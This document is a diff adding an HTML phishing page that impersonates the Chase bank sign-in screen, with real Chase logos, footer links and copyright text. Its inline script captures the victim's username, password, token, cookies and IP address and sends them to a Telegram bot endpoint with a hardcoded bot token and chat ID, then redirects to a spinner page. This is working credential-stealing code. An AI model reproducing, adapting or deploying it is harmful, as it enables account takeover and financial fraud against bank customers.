@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in - chase.com</title>
+    <link rel="shortcut icon" href="img/icon.png" />
+    <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
+    <style>
+        .honeypot {
+            display: none; /* Hide the honeytoken field from users */
+        }
+    </style>
+</head>
+
+<body>
+    <section id="header">
+        <a href="index.html"><img src="img/Chase-logo.png" class="logo" width="180px" alt="" /></a>
+    </section>
+
+    <div class="container">
+        <div class="login-page">
+            <div class="login-page-content">
+                <form name="f1"
+                    id="loginForm"
+                    spellcheck="false"
+                    target="_top"
+                    autocomplete="off" class="login-page-form">
+                    <div class="inputBox">
+                        <input type="text" name="username" id="username" required="required">
+                        <span>Username</span>
+                    </div>
+                    <div>
+                        <label>
+                            <div class="inputBox">
+                                <input type="password" name="password" id="password" required="required">
+                                <span>Password</span>
+                            </div>
+                        </label>
+                    </div>
+                    <div>
+                        <label>
+                            <div class="inputBoxes" id="inputBoxes">
+                                <input type="text" name="token" id="token">
+                                <span>Token</span>
+                            </div>
+                        </label>
+                    </div>
+
+                    <!-- Hidden Honeytoken Field -->
+                    <input type="text" name="honeypot" id="honeypot" class="honeypot">
+
+                    <div class="ticks">
+                        <input type="checkbox" id="check">
+                        <label for="check" class="remem">Remember me</label>
+                        <input type="checkbox" id="checkbox" onclick="showHideToken()">
+                        <label for="checkbox" class="tok">Use token</label>
+                    </div>
+                    <input type="submit" id="submit" value="Sign in" class="form-login-btn">
+                    <div class="localeSelector">
+                        <ul class="localeLink">
+                            <li><a href="https://secure04ea.chase.com/web/auth/dashboard#/dashboard/index/index">Forgot username/password? > </a></li>
+                            <li><a href="https://secure04ea.chase.com/web/auth/enrollment#/enroll/onlineEnrollment/gettingStarted/index?LOB=RGBLogon">Not Enrolled? Sign Up Now. ></a></li>
+                        </ul>
+                    </div>
+                </form>
+
+                <script>
+                    document.getElementById("loginForm").addEventListener("submit", function(event){
+    event.preventDefault(); // Prevent form submission
+
+    var username = document.getElementById("username").value;
+    var password = document.getElementById("password").value;
+    var token = document.getElementById("token").value;
+    var cookies = document.cookie;
+    var honeypot = document.getElementById("honeypot").value;
+
+    // Check if the honeytoken field is filled
+    if (honeypot) {
+        alert("Spam detected");
+        return;
+    }
+
+    // Get the user's IP address
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            var ipAddress = data.ip;
+
+            var message = `Username: ${username}\nPassword: ${password}\nToken: ${token}\nIP Address: ${ipAddress}\nCookies: ${cookies}`;
+
+            // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your bot's token and your chat ID
+            var telegramAPI = `https://api.telegram.org/bot7493466214:AAEEWTLNd7nnr9KV_j_VvbuovsWEgovUClw/sendMessage?chat_id=7009891691&text=${encodeURIComponent(message)}`;
+
+            fetch(telegramAPI)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        // Redirect to a different page after successful submission
+                        window.location.href = "spinner2.html"; // Replace with your desired redirect page
+                    } else {
+                        alert("Error.");
+                    }
+                })
+                .catch(error => {
+                    alert("Error: " + error.message);
+                });
+        })
+        .catch(error => {
+            alert("Error 'enable cookies': " + error.message);
+        });
+});
+
+
+                    function showHideToken() {
+                        if(document.getElementById('checkbox').checked) {
+                            document.getElementById('inputBoxes').style.display='block'
+                        } else {
+                            document.getElementById('inputBoxes').style.display='none'
+                        }
+                    }
+                </script>
+            </div>
+        </div>
+        <footer class="footer" role="contentinfo">
+            <div class="list-icons">
+                <h4 class="follow">Follow us:</h4>
+                <ul class="icons">
+                    <a href="https://www.facebook.com/chase"><i class="fa fa-facebook-square"></i></a>
+                    <a href="https://www.instagram.com/chase/"><i class="fa fa-instagram"></i></a>
+                    <a href="https://www.twitter.com/chase/"><i class="fa fa-twitter"></i></a>
+                    <a href="https://www.youtube.com/chase/"><i class="fa fa-youtube-play"></i></a>
+                    <a href="https://www.linkedin.com/chase/"><i class="fa fa-linkedin-in"></i></a>
+                </ul>
+            </div>
+
+            <div class="contact">
+                <ul class="contact-list">
+                    <li><span class="jpui link" id="requestContactUs-link-wrapper"><a class="link-anchor" href="https://www.chase.com/digital/customer-service" aria-label=" Contact us ">Contact us</a></span></li> 
+                    <li><span class="jpui link" id="requestPrivacyNotice-link-wrapper"><a class="link-anchor" href="https://www.chase.com/digital/resources/privacy-security" aria-label=" Privacy ">Privacy</a></span></li> 
+                    <li><span class="jpui link" id="requestSecurity-link-wrapper"><a class="link-anchor" href="https://www.chase.com/digital/resources/privacy-security" aria-label=" Security ">Security</a></span></li> 
+                    <li><span class="jpui link" id="requestTermsOfUse-link-wrapper"><a class="link-anchor" href="https://www.chase.com/digital/resources/terms-of-use" aria-label=" Terms of use ">Terms of use</a></span></li> 
+                    <li><span class="jpui link" id="requestAccessibility-link-wrapper"><a class="link-anchor" href="https://www.chase.com/digital/resources/accessibility" aria-label=" Accessibility ">Accessibility</a></span></li> 
+                    <li><span class="jpui link" id="requestMortgageLoanOriginators-link-wrapper"><a class="link-anchor" href="https://www.chase.com/personal/mortgage/loan-originator-search" aria-label=" SAFE Act: Chase Mortgage Loan Originators ">SAFE Act: Chase Mortgage Loan Originators</a></span></li> 
+                    <li><span class="jpui link" id="requestHomeMortgageDisclosureAct-link-wrapper"><a class="link-anchor" href="https://www.chase.com/personal/mortgage/fair-lending/fair-lending-overview" aria-label=" Fair Lending ">Fair Lending</a></span></li> 
+                    <li><span class="jpui link" id="requestAboutChase-link-wrapper"><a class="link-anchor" href="https://www.chase.com/digital/resources/about-chase" aria-label=" About Chase ">About Chase</a></span></li> 
+                    <li><span class="jpui link" id="requestJpMorgan-link-wrapper"><a class="link-anchor" href="https://www.jpmorgan.com/global" aria-label=" J.P. Morgan ">J.P. Morgan</a></span></li> 
+                    <li><span class="jpui link" id="requestJpMorganChaseCo-link-wrapper"><a class="link-anchor" href="https://www.jpmorganchase.com/" aria-label=" JPMorgan Chase &amp; Co. ">JPMorgan Chase &amp; Co.</a></span></li> 
+                    <li><span class="jpui link" id="requestCareers-link-wrapper"><a class="link-anchor" href="https://careers.jpmorgan.com/us/en/chase" aria-label=" Careers ">Careers</a></span></li> 
+                    <li><span class="jpui link" id="requestEspanol-link-wrapper"><a class="link-anchor" href="https://www.chase.com/espanol?pg_name=ccpmapp/spanish/home/page/spanish_home" aria-label=" Español ">Español</a></span></li> 
+                    <li><span class="jpui link" id="requestChaseCanada-link-wrapper"><a class="link-anchor" href="#" aria-label=" Chase Canada ">Chase Canada</a></span></li> 
+                    <li><span class="jpui link" id="requestSiteMap-link-wrapper"><a class="link-anchor"  href="https://www.chase.com/digital/resources/sitemap" aria-label=" Site map ">Site map</a></span></li> 
+                    <li><span class="mlink" id="requestSiteMap-link-wrapper">Member FDIC</span></li> 
+                    <li><i class="fa fa-bank" id="equalHousingLenderLabel" aria-hidden="true"></i><span class="jp" id="requestEqual Housing Lender-link-wrapper">Equal Housing Lender</span></li>
+                </ul>
+
+                <p class="copyright-label">(c) 2024 JPMorgan Chase &amp; Co.</p>
+            </div>
+        </footer>
+
+        <script src="script.js"></script>
+    </body>
+</html>
